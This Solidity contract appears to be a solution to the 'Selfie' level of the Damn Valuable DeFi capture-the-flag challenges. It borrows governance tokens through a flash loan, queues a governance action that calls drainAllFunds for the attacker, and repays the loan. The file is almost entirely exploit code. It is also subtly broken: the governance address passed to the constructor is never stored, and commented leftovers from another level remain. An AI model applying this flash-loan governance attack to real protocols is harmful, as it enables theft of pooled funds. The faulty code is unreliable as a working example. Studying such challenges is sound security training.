// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
// import "../DamnValuableToken.sol";
import "hardhat/console.sol";

// import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";

/**
 * @title AttackSelfiePool
 * @author sidarth16
 */

interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

contract AttackSelfiePool {

    using Address for address;

    IERC20 token ;
    address flashLoanPool ;
    address governance;
    address attacker;

    constructor (
        address _token,
        address _flashLoanPool,
        address _governance
    ) {
        // rewarderPool = TheRewarderPool(_rewardPool);
        flashLoanPool = _flashLoanPool;
        token = IERC20(_token);
        attacker = msg.sender;
    }

    function attack(uint256 amt) external
    {   
        console.log("Attack called for : ",amt);
        IFlashLoanerPool(flashLoanPool).flashLoan(amt);
        
        // // Send Looted tokens to the attacker
        // uint256 rewards_balance = rewardToken.balanceOf(address(this));
        // rewardToken.transfer(attacker , rewards_balance );
    }

    function receiveTokens(address _token, uint256 amt) external {
        console.log("Received Flash loan : ",amt);
        
        console.log("");
        governance.functionCall(
            abi.encodeWithSignature(
                "queueAction(address,bytes,uint256)",
                flashLoanPool,
                abi.encodeWithSignature("drainAllFunds(address)", attacker),
                0
            )
        ); 

        // Transfer amt back to the pool
        IERC20(_token).transfer(flashLoanPool, amt);

    }

}
